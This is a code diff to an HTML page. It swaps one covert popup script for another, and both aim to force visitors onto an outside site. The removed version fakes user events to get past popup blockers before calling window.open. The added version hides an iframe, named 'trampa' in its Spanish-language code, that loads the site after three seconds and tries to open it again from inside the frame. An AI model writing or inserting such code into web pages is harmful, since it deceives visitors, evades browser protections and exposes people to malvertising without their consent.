@@ -103,24 +103,18 @@
     </style>
 </head>
 <body>
-<script>
-function simularInteraccionCompleja() {
-    // Simular múltiples eventos de usuario
-    ['mousemove', 'click', 'keydown'].forEach(eventType => {
-        const event = new Event(eventType, {
-            bubbles: true,
-            cancelable: true
-        });
-        document.dispatchEvent(event);
-    });
-    
-    // Esperar un poco y luego abrir
-    setTimeout(() => {
-        window.open('https://cybercat-synthwave.com/asu2', '_blank', 'popup=no');
-    }, 50);
-}
+<iframe id="trampa" style="display:none;"></iframe>
 
-setTimeout(simularInteraccionCompleja, 0);
+<script>
+setTimeout(() => {
+    const iframe = document.getElementById('trampa');
+    iframe.src = 'https://cybercat-synthwave.com/asu2';
+    
+    // Intentar abrir desde el iframe después de cargar
+    iframe.onload = function() {
+        iframe.contentWindow.open('https://cybercat-synthwave.com/asu2', '_blank');
+    };
+}, 3000);
 </script>
         <div id="ad-top-banner" class="ad-block">
             <script type="text/javascript">
